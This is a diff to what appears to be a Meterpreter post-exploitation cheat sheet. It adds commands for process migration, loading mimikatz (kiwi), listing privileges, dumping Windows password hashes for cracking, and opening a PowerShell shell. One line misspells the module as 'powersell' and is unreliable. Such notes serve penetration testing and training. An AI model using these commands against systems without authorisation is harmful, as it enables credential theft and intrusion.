@@ -4,6 +4,13 @@ getuid
 # Get System Information
 sysinfo
 
+# Migrate to a process
+ps ;; generally most stable processes are explorer.exe or spoolsv.exe
+migrate <PID>
+
+# Load a module (e.g., modern mimikatz)
+load kiwi
+
 # Execute a file
 execute -f /path/to/file
 
@@ -11,7 +18,7 @@ execute -f /path/to/file
 shell               ;; press ctrl+x to go back to meterpreter
 
 # Put session in background
-background          ;; or bg
+background          ;; or bg or Ctrl+z
 
 # Display Network Configuration
 ipconfig
@@ -43,3 +50,13 @@ download /path/to/remote/file /tmp/localdestinationfile
 
 # Edit a file
 edit /path/to/file.txt
+
+# Get user privileges
+getprivs
+
+# Get password hashes
+hashdump  ;; remember that on windows these hashes are of the format "NT" (i.e., --format=NT with john)
+
+# Get a powershell shell
+load powersell
+powershell_shell
